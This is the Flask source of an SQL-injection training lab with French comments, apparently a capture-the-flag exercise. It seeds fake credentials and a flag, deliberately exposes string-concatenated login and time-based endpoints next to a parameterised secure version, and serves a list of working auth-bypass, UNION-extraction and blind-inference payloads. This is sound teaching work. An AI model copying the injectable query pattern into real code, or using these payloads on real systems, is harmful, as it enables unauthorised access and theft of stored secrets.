from flask import Flask, request, jsonify, render_template
import sqlite3
import time
import os

app = Flask(__name__)
DB_PATH = "/tmp/lab.db"

# ─────────────────────────────────────────
# Init DB
# ─────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        DROP TABLE IF EXISTS users;
        DROP TABLE IF EXISTS secrets;

        CREATE TABLE users (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role     TEXT DEFAULT 'user'
        );

        CREATE TABLE secrets (
            id    INTEGER PRIMARY KEY AUTOINCREMENT,
            label TEXT,
            value TEXT
        );
    """)
    c.executemany("INSERT INTO users (username,password,role) VALUES (?,?,?)", [
        ("admin", "Adm!n_S3cr3t",  "admin"),
        ("alice", "alice1234",      "user"),
        ("bob",   "b0bpassword",    "user"),
    ])
    c.executemany("INSERT INTO secrets (label,value) VALUES (?,?)", [
        ("FLAG",    "CTF{t1m3_b4s3d_sqli_pwn3d}"),
        ("API_KEY", "sk-prod-xK9mN2pL7qR4sT8v"),
        ("DB_PASS", "MySup3rS3cr3tDBPassword"),
    ])
    conn.commit()
    conn.close()

# ─────────────────────────────────────────
# Routes
# ─────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/stats")
def stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    nb_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM secrets")
    nb_secrets = c.fetchone()[0]
    conn.close()
    return jsonify({"users": nb_users, "secrets": nb_secrets})


# ❌ Endpoint VULNÉRABLE
@app.route("/api/login/vulnerable", methods=["POST"])
def login_vulnerable():
    data     = request.get_json(force=True)
    username = data.get("username", "")
    password = data.get("password", "")

    # DANGEREUX : concaténation directe
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

    t0 = time.time()
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query)
        rows = c.fetchall()
        conn.close()
    except Exception as e:
        elapsed = round((time.time() - t0) * 1000, 2)
        return jsonify({"success": False, "error": str(e),
                        "elapsed_ms": elapsed, "query": query}), 400

    elapsed = round((time.time() - t0) * 1000, 2)
    if rows:
        return jsonify({"success": True,
                        "user": {"username": rows[0][1], "role": rows[0][3]},
                        "elapsed_ms": elapsed, "query": query})
    return jsonify({"success": False, "message": "Identifiants incorrects",
                    "elapsed_ms": elapsed, "query": query})


# ✅ Endpoint SÉCURISÉ
@app.route("/api/login/secure", methods=["POST"])
def login_secure():
    data     = request.get_json(force=True)
    username = data.get("username", "")
    password = data.get("password", "")

    query = "SELECT * FROM users WHERE username=? AND password=?"

    t0 = time.time()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, (username, password))
    rows = c.fetchall()
    conn.close()
    elapsed = round((time.time() - t0) * 1000, 2)

    if rows:
        return jsonify({"success": True,
                        "user": {"username": rows[0][1], "role": rows[0][3]},
                        "elapsed_ms": elapsed, "query": query})
    return jsonify({"success": False, "message": "Identifiants incorrects",
                    "elapsed_ms": elapsed, "query": query})


# 🕐 Endpoint Time-Based blind
@app.route("/api/timebased", methods=["POST"])
def time_based():
    data    = request.get_json(force=True)
    payload = data.get("payload", "")

    query = f"SELECT id FROM users WHERE username='{payload}'"

    t0 = time.time()
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query)
        rows = c.fetchall()
        conn.close()
    except Exception as e:
        elapsed = round((time.time() - t0) * 1000, 2)
        return jsonify({"error": str(e), "elapsed_ms": elapsed, "query": query}), 400

    elapsed = round((time.time() - t0) * 1000, 2)
    inference = "⚡ Condition VRAIE (réponse rapide)" if elapsed < 300 else "🔴 Condition FAUSSE (délai détecté)"

    return jsonify({
        "elapsed_ms": elapsed,
        "rows":       len(rows),
        "query":      query,
        "inference":  inference
    })


# 📦 Payloads prédéfinis
@app.route("/api/payloads")
def get_payloads():
    return jsonify([
        {
            "name":    "Bypass auth basique",
            "username":"' OR '1'='1",
            "password":"anything",
            "desc":    "Court-circuite WHERE → connecté sans connaître le mot de passe"
        },
        {
            "name":    "Commentaire SQL (--)",
            "username":"admin'--",
            "password":"n'importe quoi",
            "desc":    "Le -- commente le reste → le mot de passe est ignoré"
        },
        {
            "name":    "UNION – extraction secrets",
            "username":"' UNION SELECT 1,label,value,'admin' FROM secrets--",
            "password":"",
            "desc":    "Exfiltre la table secrets via UNION SELECT"
        },
        {
            "name":    "Time-based – condition vraie",
            "username":"admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(1) ELSE randomblob(1) END) IS NOT NULL--",
            "password":"",
            "desc":    "Condition toujours vraie → réponse immédiate (contrôle de référence)"
        },
        {
            "name":    "Time-based – délai conditionnel",
            "username":"admin' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin')>0 THEN (SELECT SUM(s.id) FROM secrets s,users u,users u2) ELSE 1 END)>0--",
            "password":"",
            "desc":    "Si admin existe → jointure coûteuse → délai mesurable → inférence de données"
        },
    ])


if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=False)